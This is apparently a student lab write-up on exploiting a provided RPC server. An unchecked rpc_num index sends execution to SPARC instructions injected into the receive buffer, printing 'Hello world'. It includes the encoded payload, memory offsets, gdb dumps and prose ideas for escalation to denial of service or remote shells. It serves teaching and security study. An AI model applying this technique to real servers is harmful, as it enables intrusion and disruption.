A full exmaple of a stack overflow exploit via RPC. vulnerable server provided.

RPC Overview:
-------------	
	Remote procedure call (RPC) techniques establish a way of communication between a server system and a client system 
	that can be located on the same computer or based on a network of machines. 
	RPC is appropriate for client/server applications where the client can issue a request call and wait for the server's
	response before continuing it's own processing. 	
	Before sending data over the network, RPC needs to marshall the data to convert into the network format.
	on the other hand, when the server/client recieves the data it needs to unmarshall the data into a compatible 
	format with its local operationg system.  This idea is very similar to the marshalling and unmarshaling concepts used 
	in storing and retreeving data into and from hard disks.


Project Objective:
------------------
	The objective of this project is to learn how Remote Procedure Calls are implemented, learn about networking basics, find 
	security vulnerabilities, and break into the provided RPC system.
 
 
Understanding the Provided Code:
--------------------------------
	In this project we were given an RPC system implementation (rpc.c, rpc.h, rpc_service.c, rpc_service.h) as well as a sever 
	that utilizes this RPC system.  We were also given an example of some clients that implements the same rpc system.
	
	The general idea is that the client prompts the user for a certain rpc number and for some numeric inputs.
	then the client initializes its rpc connection ussing the following code:
		srss_client_init(&state,3);
	Next, the client marshalls the data properly, for example: the below code marshals the following data (integer, float, integer, 
	float, integer).
		srss_marshall(&state,"dlfdlfd",i0,d0,i1,d1,i2);
	After marshalling the appropriate data, the client calls:
		srss_rpc(&state,which);
	The above statement insisde the client does the folowing:
		- Writes into the socket the rpc number, the packet-size(number of bytes transfered), and the out_buff.  
		Out_buf is the buffer that contains the sent data. its size is stored in the out_ix varible.
		- Reads from another socket the data representing the server's response.
		What read does is that is blocks the current running process until the specified data is recieved.
	After srss returns, the client continues its current process.
		
	The server on the other hand, works very similar to the way the client works.
	The server provided is a stand-alone-server.  Everytime the server gets a connection from a client it forks to generate a child
	process for that client.  That way the server can handle more than one client.
	
	When the server is started, it calls the 
		rpc_service(ss);
	method where ss is the socket-number. this method basically calls other methoeds resulting in initializing the server and then 
	calling the 
		srss_service($ifc , 1);
	The above method reads from the socket the rpc-number and the packet-size.  Then it calls the rpc-handler method corresponding 
	to the given rpc number. Finally, it writes the data to be sent to client into out_buf.
	The rpc-handler methods unmarshalls the data received from the client, process this data and then marshalls the result to be 
	sent back to the client.
	
	
Server Bugs and Possible Exploits:
----------------------------------
	After learning about the RPC system, and exploring the code for the server system in more details, we started looking for bugs 
	and possible exploits.  We were able to identify the following weaknesses in the servers system:
	
	1)
		The first bug we identified is in the below function:
			int srss_service(struct srss_state	*state, int	ignore_recoverable_errors)
			
		We noticed that this function does not check for input boundries.  Lets take the rpc-number as an example.  
		We notice that the server can only process rpc numbers 0 and 1. For all other inputs, the server executes the 
		following code
		
		if (!entry->rpc_handler) {
				/*
				 * deprecated entry -- use a NULL ptr to indicate
				 * that an RPC entry point is now obsolete
				 * (this allows versioning).
				 */
				if (DEBUG) {
					fprintf(stderr,"deprecated interface, ignored\n");
				}
				barf(SRSS_BAD_RPC_ENTRY);
				continue;
			}
			
		The problem here is that the above code does not check for rpc boundries.  Instead it tries to acess the rpc-handler 
		function 
			entry->rpc_handler 
		where: 
			entry = &state->entry_pts[rpc_num]; 
		and then check if it null then send the bad reply to the client.
		
		Also notice that it is a bad programming practice to declare the num_enties, out_ix, and in_ix as integers as below:
				
				struct srss_state {
				int			sock;
				int			num_entries;
				struct srss_entry	*entry_pts;
				int			in_ix, out_ix;
				char			in_buf[MAX_RPC_SIZE], out_buf[MAX_RPC_SIZE];
				void			(*fn)(struct srss_entry *);
				};
		Since these values sould never be negative, it is better if they were declared as unsigned integers.
		
	2)
		Looking inside the rpc_service,  We notice the following code:
		
				struct srss_entry entries[] = {
				{ "RPC 0", rpc_hndlr0, },
				{ "RPC 1", rpc_hndlr1, },
				};
			
				struct srss_state	ifc;
					
			The problem here is that these variables are declared as global variables, which means that they are locaated
			on the data 
		section of the memory stack.  As we know, the data section is has read/write privileges. In other words you can write 
		and execute code
		in the data section.
		To solve the above problem, the above variables should be local inside the 
				int start_service(int sock) 
		function.  By making the above data local it can be easily protected by the operating system by setting:
				set noexec_user_stack = 1		
		which makes it impossible to execute code from the stack segment. 
		
	3)
		Examining the following function:
	
			void srss_set_str(struct srss_state	*sp, char *s)
			{
				char	*str;
				int	len;
		
				str = sp->out_buf + sp->out_ix;
				len = strlen(s);
				strcpy(str,s);
				sp->out_ix += len + 1;	/* null */
			}
		We notice that in the above function strcpy is being used to copy a string into out_buf.
		Since strcpy does not check for overflow of the array pointed to by the first argument, we suspect that it could be a 
		possible exploit. 				
	
		in srss_set_str which is used by the srss_marshall routine, the string s is copied into string str which points to a 
		place in state->out_buf, so if a very large string is passed in it could override past the end of state->out_buf and 
		possibly a return address and change the course of the program and have it jump back to this buffer or somewhere 
		else to execute vicious code. 	
			
	
	4)
	
		By using functions that do not check for boundary such as memcpy or memset on the server, attackers can calculate the
		relative address of these functions, and use them to modify values in memory, which might be dangerous to data
		integrity.  
	
	
	
	
	
		Ex: memcpy was used in the below function:
		
		uint32_t	srss_get_uint32(struct srss_state	*sp)
				{
					uint32_t	num;
				
					memcpy(&num,&sp->in_buf[sp->in_ix],sizeof num);
					sp->in_ix += sizeof num;
					return ntohl(num);
				}
				
		Ex: memset was used in the below function:
		
		void srss_init_internal(struct srss_state	*state,
			int			sock)
		{		
			state->sock = sock;
			/*
			 * we don't know whether this is the client or the server yet.
			 * the I/O buffering and marshalling/unmarshalling code is the
			 * same.
			 */
			state->in_ix = state->out_ix = 0;
			memset(state->in_buf, 0,MAX_RPC_SIZE);
			memset(state->out_buf,0,MAX_RPC_SIZE);
		}
		
		Attackers can easily get the address of these function call using gdb
		

How the attack works
--------------------

The problem was that the server in function srss_service() was not
doing bounds checking on indexing the state->entry_pts to get the
current rpc entry. This allows us to be able to alter the rpc entry
that the server is going to process by indexing it out of range to an
entry that we have designated. Looking at the layout of the entries
and ifc structure in the global data section(this is depicted in figure
1) we obeserve that entries is declared before ifc and thus must be in
lower memory. 

struct srss_entry entries[] = {            <----0x23e34
	{ "RPC 0", rpc_hndlr0, },
	{ "RPC 1", rpc_hndlr1, },
};

struct srss_state	ifc;               <----0x2425c

in srss_server_init, the entries is assigned to entry_pts of the ifc
structure. 

The server first reads in the rpc number(rpc_num) from the TCP
stack. However it does not check to see if rpc_num is within
range(0,1), the other clients we had do this check on the client side
but the server should also assert this check but it fails to do so,
leaving a security vulnerability that could be exploited. This rpc_num 
is then used to index the state->entry_pts array to get the rpc entry
to handle the client's request. Since the server is reading in the
data from the client into state->in_buf, we are going to inject our
assembly instructions in this buffer to print out "Hello world" to the 
standard output. After getting the rpc entry, the server will call
entry->rpc_handler function to handle the rpc request. We calculated
the distance between the entries structure and the state->in_buf and
we found it to be 1084 bytes. since each rpc entry consists of a char* 
for the name which is 4 bytes and a function pointer to the rpc_hndler 
wich is also 4 bytes then each entry is 8 bytes wide. Therefore we
need to calculate multiples of 8 from entries to our vicious rpc entry 
in the state->in_buf. the next multiple of 8 is 1088 therefore we put 4 bytes
of padding in the beginning of state->in_buf before we put our
entry. This will give us 1088/8 = 136. We then imagine our
entries(state->entry_pts) as an extended array now instead of having 2 
elements, it will have 137 elements the last of which is our vicious
entry). Since indicies in C start with zero, the index of our entry is 
at 136. So we pass in 136 as the rpc_num which will index into the
entry_pts array and get our entry which has as its fist element 
representing the name of our rpc entry and as the second
word, we put the address of the begining of our injected code which is
the next contiguous word of memory. This address is treated as a
function pointer and when called to handle the rpc request, it will
jump to the next word of memory where our first instruction
is(sethi). 

Our attack code is basically 6 assembly instructions that print the
string "Hello world" to standard output of the server. When the
rpc_hndler of our entry is called it will jump to address 0x2427c via
a call instruction to handle the rpc client. The instructions that are
executed are as follows:

sethi %hi(0x24294),%o1			!0x24294 is the address of the attack string.
or    %o1,%lo(0x24294),%o0
call  printf
nop
ret 
restore

The instructions above are shown as their 32 bit binary equivalent
below:

sethi	0 0 0 1   0 0 0 1   0 0 0 0   0 0 0 0   0 0 0 0   0 0 0 0   1 0 0 1   0 0 0 0		( 0x11000090 )
or	1 0 0 1   0 0 0 0   0 0 0 1   0 0 1 0   0 0 1 0   0 0 1 0   1 0 0 1   0 1 0 0		( 0x90122294 )
call	0 1 1 1   1 1 1 1   1 1 1 1   1 1 1 1   1 1 1 1   1 1 1 1   0 1 0 1   0 0 0 0		( 0x7FFFFF50 )
nop	0 0 0 0   0 0 0 1   0 0 0 0   0 0 0 0   0 0 0 0   0 0 0 0   0 0 0 0   0 0 0 0		( 0x01000000 )
ret	1 0 0 0   0 0 0 1   1 1 0 1   0 1 1 1   1 1 1 0   0 0 0 0   0 0 0 0   1 0 0 0		( 0x81D7E008 )
restore 1 0 0 0   0 0 0 1   1 1 1 0   1 0 0 0   0 0 0 0   0 0 0 0   0 0 0 0   0 0 0 0		( 0x81E80000 )

We put the string "Hello world" right after the restore
instruction and calculated its address 0x24294 and set that to be the
first argument to printf so it will print it. In order to send these
instructions to the server we had to encode them into their 32 bit
SPARC instruction equivalent. After encoding these
instructions(bytes) are serialized(marshalled) and put on the client's 
state->out_buf and written to the TCP queue using the write system
call which blocks until it has written the data. Below the picture of
the transaction between the attack client and server are depicted:
-----------------               -----------------
| attack client  |		|  poor server	|
| ______________ |		| _____________	|
||state->out_buf||-->--TCP-->---||state->in_buf||
| -------------- |		| -------------	|
-----------------		-----------------

Since SPARC instructions are 32 bits, we encode them using
integers. We basically looked up the instructions and encoded them
with the values that we had calculated. 
We use bit masking to make an instruction with given registers and
addresses(for more info look at comments in the code). 
The basic actions of the attack client are as follows:
1)construct the encoding for the instructions into integers
2)initialize the client's state structure
3)marshall the instructions as integers and the attackmessage("Hello
world") as string.
4)while not successfull send the serialized message using the provided 
rpc mechanism to the server
5)exit client

An rpc message with our instructions as the message body are sent to the 
server and put into its state->in_buf buffer. 
After that the write system call on the attack client unblocks 
and the client exits. Meanwhile the server forks a new process to
handle the rpc request that has just come in. The state->entry_pts
array is indexed with the given rpc_num(136) for the rpc entry. The
rpc handler jumps to the address of our sethi instruction and starts
executed what it thinks is the rpc handler function but instead the
string "Hello world" is printed to the standard output of the server
and then ret and restore instructions are executed and the program
counter is restored to where it was before the rpc_hndler function was 
called. Notice that we don't need a save instruction because we are
not using or saving anything on the stack in our simple
program. However if a more sophisticated attack program was
designated, a save instruction may be necessary. 

This attack is sort of benign because it only prints out a string on
the server's standard output. Even though it changes the way the rpc
service is handled, it does not cause any loss of integrity because it 
does not overwrite any of the server's variables or data(we put our
code into a buffer which is allocated for the client's data). It is
however possible to violate many of the security goals using this same
method of attack; this is further explained later in this document.


The stack overview:
-------------------
	
		------------------------       <---- 0x23e34
srss_entry[0]     &rpc_name (4 bytes)
		  &rpc_handler (4)
		------------------------
srss_entry[1]	  &rpc_name (4)
		  &rpc_handler (4)
		------------------------
			 ..........
		========================       <---- 0x2425c
		  int sock (4)
		------------------------
		  int num_entries (4)
		------------------------
		  struct ptr* entry_pts (4)
srss_state  	----------------------
		  int in_ix (4)
		------------------------
		  int out_ix (4)
		------------------------       <---- 0x24270  (0x2425 + 20)
		  in_buf (1024 bytes)
		------------------------
	   	  out_buf (1024)
		------------------------
		    
		    	Figure 1





We will try to calculate the offset from the start of srss_entry to the address of the attack code inside in_buf.  Since an srss_entry's
size is 8 bytes (4 bytes for name and 4 bytes for handler), we need to jump multiple of 8 bytes.
	
Using gdb, we were able to get the start address of srss_entry as 0x23e34.  The address of the beginning of srss_state is 0x2425c, 
so the start address of in_buf is 0x24270, which is 20 bytes after the start of srss_state.


Below is the detail addresses of elements inside in_buf:


	
 0x24270 -->	-------------------
		 padding (4 bytes)
 0x24274 -->	-------------------
		 &rpc_name (4)
		-------------------
		 &rpc_handler (contains 0x2427c) (4)
 0x2427c -->	-------------------
		 function to print (24)  ------->    --------------
 0x24294 -->	-------------------                     sethi (4 bytes) 
		  "Hello world\n"		     --------------
		-------------------			or (4)
				                     --------------         <--- 0x24288               
                                                        call printf (4)
						     --------------
							nop (4)
						     --------------
						  	ret (4)
						     --------------
						  	restore (4)
					     	     --------------

				Figure 2
				
The offset from the start of srss_entry to the start of in_buf is 0x24270 - 0x23e34 = 1084.  Since we need to jump to address with 
distance that is multiple of 8 bytes, we need to skip 4 bytes of in_buf, and start our attack struct at 0x24274.  A 4-byte padding 
will be added for these 4 bytes.  At 0x24274 we have the rpc_name, which we store another 4-byte padding there.  "rpc_handler" will 
have the address where we want to execute our attack code (function to print).  The function will contain all the code neccessary 
to emulate a function.


Below is the hex output of the attack struct (rpc_name and rpc_handler)
(gdb) x/2x 0x24274
0x24274 <ifc+24>:	0xffffffff	0x0002427c
     
The 0xffffffff is the value of rpc_name, which we just made it to be a junk value
The 0x0002427c is the value of rpc_handler, which contains address of the attack function that print the string "hello world" out 



Below is the 6 instructions that will print "hello world"
(gdb) x/6i 0x2427c
0x2427c <ifc+32>:	sethi  %hi(0x24000), %o0
0x24280 <ifc+36>:	or  %o0, 0x294, %o0	! 0x24294 <ifc+56>
0x24284 <ifc+40>:	call  0x23fc4 <printf>
0x24288 <ifc+44>:	nop 
0x2428c <ifc+48>:	ret 
0x24290 <ifc+52>:	restore 



Below is the string "hello world" at the specify address
(gdb) x/s 0x24294
0x24294 <ifc+56>:	 "Hello world\n"



To call printf, we need to calculate the relative address of printf to the address of our current call to printf.  Using gdb, we
found the absolute address of printf to be 0x23fc4.  The address of our call to printf is 0x24288.  So to call printf, we subtract our
call address from the printf address as below:
			
				(0x23fc4 - 0x24284) >> 2 
The reason we right-shifted our result by 2 is that the high 2 bits of the call instruction are 01.
Next all we had to do is to add these two bits in the call instruction.  We did the following:
  	 

				( (0x23fc4 - 0x24284) >> 2 ) & 0x3FFFFFFF) | 0x40000000.

To get the absolute address of printf, we can use gdb to scan through the program until we see a printf statment being used.  Since we
need the relative address of printf relative to our current address, we will subtract the printf address from the current address we are at.



other possible attacks using the above security vulnerability:
---------------------------------------------------------------
-Using the same attack we can actually cause a lot of harm to the user running the server. For example we can instead 
of running a hello world program, compile the client into assembly code and put that in the in_buff and basically run 
another copy of the client which will also connect to the server who will fork processes to deal with this client and 
that process in turn will launch another client and very quickly the server is brought down to its knees. This would 
violate the availability security goal. Since the bounds on reading into in_buf are checked we only have about 1024 
bytes(with the current settings)/1024 instructions to inject. We could use these instructions to fork a child process
that will bootstrap the actual virus.			

-If the user running the server is an administrator and has root
access, we will be able to bootstrap a starter program which will load 
the actual attack via the network from the hacker's machine and run a
shell and possibly violate all security goals.





	

					
